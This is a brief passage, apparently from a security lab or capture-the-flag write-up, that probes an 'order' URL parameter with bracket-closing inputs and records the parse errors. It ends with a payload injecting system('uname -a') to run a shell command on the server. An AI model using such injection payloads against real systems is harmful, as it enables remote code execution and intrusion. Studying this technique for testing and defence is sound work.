1. Trying different SQL injection techniques

```
?order=id;}//: we get an error message (Parse error: syntax error, unexpected ';'). We are probably missing one or more brackets.
?order=id);}//: we get a warning. That seems about right.
?order=id));}//: we get an error message (Parse error: syntax error, unexpected ')' i). We probably have too many closing brackets
?order=id);}system('uname%20-a');//
```
